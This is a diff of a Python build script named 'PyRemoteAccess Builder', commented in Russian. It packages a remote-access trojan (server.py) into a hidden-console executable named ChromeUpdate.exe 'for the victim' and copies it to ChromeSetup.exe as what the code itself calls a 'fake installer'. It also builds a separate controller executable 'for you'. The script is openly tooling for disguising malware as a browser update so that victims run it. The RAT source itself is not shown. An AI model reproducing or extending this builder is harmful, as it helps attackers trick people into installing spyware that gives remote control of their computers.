@@ -18,37 +18,70 @@ def install_pyinstaller():
     except:
         return False
 
-def build_server_exe():
-    print("Building server executable...")
-
+def build_server():
+    """Собираем server.py в EXE для жертвы"""
+    print("Building server (RAT) executable...")
+    
     cmd = [
         'pyinstaller',
         '--onefile',
         '--noconsole', 
-        '--name', 'ChromeUpdate',
+        '--name', 'ChromeUpdate',  # Для жертвы
     ]
-
+    
+    # Добавляем иконку если есть
     if os.path.exists('icon.ico'):
         cmd.extend(['--icon', 'icon.ico'])
         print("Using icon.ico")
     
-    cmd.append('server.py')
+    cmd.append('server.py')  # Собираем сервер
     
     try:
         result = subprocess.run(cmd, capture_output=True, text=True)
         if result.returncode == 0:
-            print("Build successful: dist/ChromeUpdate.exe")
+            print("Server build successful: dist/ChromeUpdate.exe")
             
+            # Создаем поддельный установщик
             if os.path.exists("dist/ChromeUpdate.exe"):
                 shutil.copy2("dist/ChromeUpdate.exe", "ChromeSetup.exe")
                 print("Fake installer created: ChromeSetup.exe")
             return True
         else:
-            print("Build failed")
+            print("Server build failed")
             print(result.stderr)
             return False
     except Exception as e:
-        print(f"Build error: {e}")
+        print(f"Server build error: {e}")
+        return False
+
+def build_controller():
+    """Собираем main.py в EXE контроллера для тебя"""
+    print("Building controller executable...")
+    
+    cmd = [
+        'pyinstaller',
+        '--onefile',
+        '--name', 'SystemManager',  # Для тебя
+    ]
+    
+    # Добавляем иконку если есть
+    if os.path.exists('icon.ico'):
+        cmd.extend(['--icon', 'icon.ico'])
+        print("Using icon.ico")
+    
+    cmd.append('main.py')  # Собираем контроллер
+    
+    try:
+        result = subprocess.run(cmd, capture_output=True, text=True)
+        if result.returncode == 0:
+            print("Controller build successful: dist/SystemManager.exe")
+            return True
+        else:
+            print("Controller build failed")
+            print(result.stderr)
+            return False
+    except Exception as e:
+        print(f"Controller build error: {e}")
         return False
 
 def install_requirements():
@@ -75,7 +108,7 @@ def install_requirements():
 
 def clean_build():
     folders = ['build', 'dist']
-    files = ['ChromeUpdate.spec']
+    files = ['ChromeUpdate.spec', 'SystemManager.spec']
     
     for folder in folders:
         if os.path.exists(folder):
@@ -87,30 +120,33 @@ def clean_build():
 
 def main():
     print("PyRemoteAccess Builder")
-    print("1 - Build server only")
-    print("2 - Install requirements") 
-    print("3 - Full build")
-    print("4 - Clean build files")
+    print("1 - Build server only (for victim)")
+    print("2 - Build controller only (for you)") 
+    print("3 - Build both")
+    print("4 - Install requirements")
+    print("5 - Clean build files")
     
     choice = input("Select: ")
     
+    if not check_pyinstaller():
+        if not install_pyinstaller():
+            print("Failed to install pyinstaller")
+            return
+    
     if choice == "1":
-        if not check_pyinstaller():
-            if not install_pyinstaller():
-                print("Failed to install pyinstaller")
-                return
-        build_server_exe()
+        build_server()
         
     elif choice == "2":
-        install_requirements()
+        build_controller()
         
     elif choice == "3":
-        if not check_pyinstaller():
-            install_pyinstaller()
-        install_requirements()
-        build_server_exe()
+        build_server()
+        build_controller()
         
     elif choice == "4":
+        install_requirements()
+        
+    elif choice == "5":
         clean_build()
         print("Cleaned")
         
